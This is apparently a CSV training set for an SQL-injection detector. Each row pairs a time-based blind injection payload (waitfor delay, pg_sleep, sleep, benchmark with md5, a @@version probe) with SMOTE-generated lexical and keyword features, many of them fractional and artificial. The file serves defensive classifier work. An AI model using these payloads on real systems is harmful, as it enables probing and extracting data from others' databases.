id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000123,attack,time,1 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000255,0.4358323503431794,24.135532540980577,17.0,3.9822314565050334,12.000000000000002,3.7570216939870535,2.378510846993528,6.0,0.4989525242612593,0.15385435006481685,0.09771686354329423,0.24947626213062962,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000124,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,0.5438417456802404,65.29044865441234,26.473034230391768,4.062108306671057,23.946068460783536,12.0,19.344380193628812,10.0,0.36742669537283057,0.18386594904931503,0.29548573137009193,0.1532216242077625,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.7634828848041155,0.0,0.0,-5.551115123125783e-17,3.236517115195884,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.2365171151958842,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.236517115195884
SMOTE_000125,attack,time,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",nearest_attack_euclidean,R000306,0.04062461585690226,46.94085405190759,22.98817081038152,4.013026514264471,23.0,3.0,11.952683241526076,8.988170810381519,0.4900508393141465,0.06391967469314955,0.2545521092851238,0.19147737670758005,2.0,3.0,0.0,0.0,0.0,1.0,0.0,0.9881708103815185,0.0,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,1.0,0.0,0.0,0.0,1.0,0.9881708103815189,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.859005962652685,43.990729712573376,16.0,2.820736874639649,10.999999999999998,0.0,22.437234220890403,10.553495491682972,0.2521163179563413,0.0,0.5078350535012911,0.24004862854236758,0.22325225415851402,1.5534954916829724,0.0,0.0,0.0,1.0,0.0,3.776747745841486,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,0.2232522541585139,0.7767477458414861,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.17531579666952704,36.87117899889323,16.0,3.2575477660785475,13.0,0.0,13.725982499077691,10.145196499815539,0.35362081548570634,0.0,0.37090611308279425,0.2754730714314994,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,3.1451964998155386,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000128,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.009796180923661238,44.946441300855454,16.982147100285154,3.07398364750014,13.0,0.9821471002851521,19.964294200570304,11.0,0.2892572820576079,0.02182549111744783,0.4441610650838913,0.2447561617410529,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R000238,0.8713996903057247,24.3016213156129,17.976215986709672,4.046906450236556,13.3016213156129,3.6745946710967754,3.0,4.325405328903225,0.5447952245921769,0.15347696002057043,0.1241467569294063,0.17758105845784633,2.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.32540532890322454,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000154,1.40214902474955,95.45198827059943,27.612997067649857,3.8187876265888465,28.92466862156676,23.301325513732955,33.6883284460831,9.53766568921662,0.3048988607410678,0.2424329951697457,0.3526810096020484,0.09998713448713809,1.0,0.0,0.0,0.0,0.0,1.5376656892166198,0.0,5.0,0.0,0.0,1.0,1.5376656892166196,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.5376656892166198,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.53766568921662
SMOTE_000131,attack,time,1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000282,1.015347634280844,111.38218941205528,29.0,3.7792018826262117,34.38218941205528,18.0,42.0,17.0,0.3086734704575496,0.1616087991138196,0.37708719793224565,0.15263053249638514,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,1.0,0.38218941205528434,0.6178105879447158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000132,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000072,0.18798957941870026,26.401446918927235,17.59855308107277,3.976936335392633,12.401446918927231,4.0,3.0,7.0,0.4695445254486912,0.15155870701465965,0.11366903026099473,0.2652277372756544,3.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000300,0.4331880467558573,100.06845650423668,27.679463048728994,3.6726316475128913,25.14523479661065,22.85476520338935,39.28214780508402,12.786308699152663,0.2522100246274025,0.22788580409992942,0.3918386883089912,0.12806548296367684,3.5726173983053244,0.0,0.0,0.0,0.0,2.0,0.0,6.213691300847338,0.0,0.0,1.0,2.0,0.8931543495763311,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,time,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000291,1.2681825707203507,88.69809729286338,26.613213515176234,3.483139130763015,22.0,18.0,38.77357296964753,9.924524323215845,0.2485315445359906,0.2033439909839923,0.4365113472330119,0.11161311724700523,0.0,0.4622621616079222,0.0,0.0,0.0,2.0,0.0,5.4622621616079226,0.0,0.0,1.0,2.0,0.0,0.4622621616079222,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000135,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000065,0.29841440992218426,60.254324576826335,23.0,3.6081329120448635,21.250864915365266,10.0,22.7525947460958,6.250864915365266,0.3532891007542826,0.1666185877763941,0.37673109237963187,0.10336121908969143,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.1672432769101775,0.0,0.0,0.08362163845508869,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.9163783615449115,0.0,0.0836216384550888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,time,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000190,0.25417153279895366,106.37764242216207,33.496476770450585,4.038172444086201,30.496476770450585,29.0,35.88116565171147,11.0,0.28682011620051395,0.27263704083064744,0.33712879299859305,0.10341404997024559,1.0,0.0,0.0,0.0,0.0,2.0,0.0,5.125880807387353,0.0,0.0,1.0,2.8741191926126466,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8741191926126465,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8741191926126466
SMOTE_000137,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000081,0.9408192542586716,49.849104853982666,17.515089514601733,3.429610729930299,23.0,2.0,17.87928388318613,6.969820970796532,0.46604872256905,0.04052597587556958,0.3542142653687348,0.13921103618664565,4.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.9698209707965324,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000198,1.5207337532913663,154.54284574391787,27.95748962106115,3.340490682572406,49.9149792421223,18.87246886318345,69.27665282808154,16.478744810530575,0.32322895510246114,0.11956384455342717,0.4503085624184775,0.10689863792563419,0.0,0.0,0.0,0.8404183964898083,0.15958160351019177,1.0,0.0,12.319163207020383,0.0,0.8404183964898083,1.1595816035101918,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.15958160351019174,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15958160351019163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.159581603510191
SMOTE_000139,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000067,0.2219553836778027,32.71248961553271,15.942497923106542,3.477442605375038,16.654987538639247,1.0575020768934582,10.057502076893456,4.942497923106542,0.5081193347522069,0.03266783433111625,0.30819553288112234,0.15101729803555447,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.9424979231065416,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.9424979231065416,0.0,0.0,0.0,0.0,0.057502076893458376,0.0,0.0,0.0,0.0,0.0,0.0,0.057502076893458265,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0575020768934582
SMOTE_000140,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000115,0.16535291030831298,70.22717745654762,27.82961690758928,3.851048232931553,16.056794364136906,20.88641127172619,24.227177456547626,9.056794364136906,0.22863721354919334,0.29754402749678244,0.34487454884192875,0.1289442101120955,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.056794364136906,1.0,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.9432056358630935,0.05679436413690642,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,time,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000230,1.0098955035728951,109.7516728438921,32.0,3.7838067443569474,26.2483271561079,29.7516728438921,42.0,11.7516728438921,0.23918035806761256,0.2710703776072867,0.3826880517561745,0.10706121256892626,0.0,1.0,1.5033456877841993,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,3.5033456877841993,0.0,1.0,0.7516728438920997,0.24832715610790035,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,time,1 where 9620  =  9620 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000146,0.2302037772248881,45.28051397357389,22.71948602642611,4.140955785162892,17.0,12.0,9.0,7.280513973573891,0.37547403983055255,0.26504049870391944,0.1987803740279396,0.16070508743758832,2.2805139735738904,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000057,0.7198205366627034,46.96336060871933,22.0,4.111020858336814,27.0,3.0,9.170688486975461,7.792672121743865,0.5760606897115205,0.06400674330128005,0.1940694967478822,0.1658630702393173,2.0,3.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.7926721217438648,0.0,0.0,-5.551115123125783e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7926721217438653,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R000242,0.0004052501695047984,27.00065122220623,20.0,4.2083886057042195,12.00024420832734,3.9999185972242213,3.0004070138788954,8.000081402775779,0.44444315233689236,0.14814306585844342,0.1111206727069963,0.29629310909766793,2.0,1.0001628055515581,1.9998371944484417,0.0,0.0,8.140277577917132e-05,0.0,0.0,1.0,0.0,-5.551115123125783e-17,1.9999185972242208,1.0,1.0,0.9999185972242208,0.0,0.0,8.140277577894928e-05,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,8.140277577911581e-05,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000814027757787
SMOTE_000145,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.2550969193890777,27.0,15.0,3.27436274471765,9.999999999999998,2.0,10.0,5.0,0.37037037037037035,0.07407407407407407,0.37037037037037035,0.18518518518518517,0.0778619997571468,0.9221380002428533,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0778619997571467,0.9221380002428533,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000146,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",nearest_attack_euclidean,R000295,0.1469640637496186,90.54246172821249,30.81917942392917,4.069318809945144,29.75890589857223,22.0,28.60273525356943,10.180820576070829,0.3290715689141555,0.2431050327698457,0.3154946402279797,0.11232875808801904,4.0,0.0,0.0,0.0,0.0,1.060273525356943,0.0,4.120547050713886,0.0,0.0,1.0,1.0602735253569429,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2570459173598681,35.72162770936514,16.0,3.0523831656807126,10.999999999999998,0.0,15.977302167492116,8.744325541873028,0.3091740668893441,0.0,0.44585515974493317,0.2449707733657228,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.744325541873029,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000148,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.07473969431431297,100.0,33.58427884756681,4.082548335687149,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000149,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000102,2.1419828596283788,68.46161829277611,22.34266943829941,3.2961097346593817,13.279737213619173,14.216804988938938,30.55947442723835,10.405601662979645,0.19289378880957772,0.20378992573190055,0.4476905014517345,0.15562578400678725,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.405601662979646,1.0,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.468533887659882,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.531466112340118,0.4685338876598821,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R000285,0.022802169324222826,29.0,14.0,3.220884299095468,15.0,1.0,10.0,3.0,0.5172413793103449,0.034482758620689655,0.3448275862068966,0.10344827586206896,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000293,0.10197895385296525,85.07985174475215,24.96827074981904,3.4653561825434824,20.90481224945712,17.746165998552314,35.55579049746655,10.873082999276159,0.24645796956620097,0.20822785484903317,0.4175690167219597,0.1277451588628062,0.0,1.0,2.0,0.0,0.0,1.9682707498190395,0.0,4.936541499638079,0.0,0.0,0.9682707498190395,3.9682707498190393,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.073242144034726,45.0,17.0,3.0740066546775076,13.0,0.9711527464326561,20.0,11.028847253567344,0.28888888888888886,0.021581172142947913,0.4444444444444444,0.24508549452371875,0.0,0.028847253567344522,2.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.028847253567344605,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000153,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000210,0.5734074105666825,57.652782702062694,18.782405765979103,3.3813165091150768,25.65278270206269,1.782405765979103,22.217594234020897,8.0,0.4447043995514638,0.03107940446101856,0.3853922958753836,0.13882390011213405,3.7824057659791026,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.2175942340208975,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.21759423402089745,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7824057659791025,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
